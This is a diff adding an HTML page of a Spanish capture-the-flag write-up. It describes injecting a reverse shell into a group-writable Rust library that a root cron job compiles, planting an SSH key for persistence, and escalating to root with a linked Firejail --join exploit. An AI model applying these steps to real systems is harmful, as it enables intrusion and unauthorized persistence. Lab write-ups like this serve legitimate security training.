+                <p>En <code>/opt/tipnet</code>, hay un binario SUID de <code>tipnet</code> que puedo ejecutar, pero tiene funcionalidad limitada y no puedo modificar <code>main.rs</code> directamente.</p>
+
+                <p>Mirando más cuidadosamente <code>main.rs</code>, noto que usa una librería (crate) personalizada llamada <code>logger</code>. Usando <code>find</code>, localizo el código fuente en <code>/opt/crates/logger/src/lib.rs</code>.</p>
+
+                <p>Comprobando los permisos:</p>
+                <pre><code class="language-bash">ls -la /opt/crates/logger/src/lib.rs</code></pre>
+
+                <pre><code class="language-plaintext">-rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs</code></pre>
+
+                <p>¡Excelente! El usuario <code>silentobserver</code> tiene permisos de escritura mediante propiedad de grupo. Esto significa que puedo inyectar código malicioso en la librería logger que será ejecutado cuando root ejecute <code>cargo run</code> como <code>atlas</code>.</p>
+
+                <h3>Inyectando Código Rust Malicioso</h3>
+                <p>Modifico <code>/opt/crates/logger/src/lib.rs</code> para incluir un payload de reverse shell. Usando el mismo patrón de imports que observé en <code>main.rs</code> y con algo de asistencia de IA para la sintaxis correcta de Rust, inyecto este código:</p>
+                <p><img src="./media/image1.png" alt="Archivo lib.rs modificado mostrando el payload de reverse shell inyectado usando el módulo Command de Rust" /></p>
+
+                <p>El código inyectado usa <code>std::process::Command</code> de Rust para ejecutar una reverse shell bash hacia mi máquina atacante. Cuando root active <code>cargo run --offline</code> como <code>atlas</code>, la librería logger será compilada y ejecutada, activando mi payload.</p>
+
+                <p>Tras configurar un listener de netcat y esperar a que la tarea programada se ejecute, recibo exitosamente una reverse shell como el usuario <code>atlas</code> real, fuera del sandbox Firejail.</p>
+
+                <h2>Escalada de Privilegios a Root - Exploit de Join en Firejail</h2>
+                <p>Ahora que tengo acceso como <code>atlas</code> con membresía en el grupo <code>jailer</code>, puedo explotar el binario Firejail con SUID.</p>
+
+                <h3>Estableciendo Persistencia</h3>
+                <p>Para asegurarme de no perder acceso, añado mi clave pública SSH a <code>/home/atlas/.ssh/authorized_keys</code>, permitiéndome reconectar mediante SSH si la shell se pierde.</p>
+
+                <h3>Explotando Firejail</h3>
+                <p>Ejecuto el exploit de escalada de privilegios de Firejail encontrado anteriormente: <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
+
+                <p>El exploit funciona abusando de la funcionalidad <code>--join</code> de Firejail. Cuando un sandbox Firejail se crea con ciertas malas configuraciones, es posible unirse al namespace y escalar privilegios.</p>
+
+                <p>Ejecutando el exploit desde una sesión SSH:</p>
+                <pre><code class="language-bash">python3 xd.py</code></pre>
+
+                <pre><code class="language-plaintext">You can now run 'firejail --join=2850' in another terminal to obtain a shell 
+where 'sudo su -' should grant you a root shell.</code></pre>
+
+                <p>Desde una segunda sesión SSH como <code>atlas</code>, me uno a la instancia Firejail:</p>
+                <pre><code class="language-bash">firejail --join=2850</code></pre>
+
+                <pre><code class="language-plaintext">changing root to /proc/2850/root
+Warning: cleaning all supplementary groups
+Child process initialized in 6.27 ms</code></pre>
+
+                <p>Aunque <code>sudo su -</code> no funcionó en mi caso, simplemente ejecutar <code>su</code> sin argumentos escala exitosamente a root:</p>
+                <pre><code class="language-bash">su</code></pre>
+
+                <pre><code class="language-bash">whoami</code></pre>
+
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag final, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
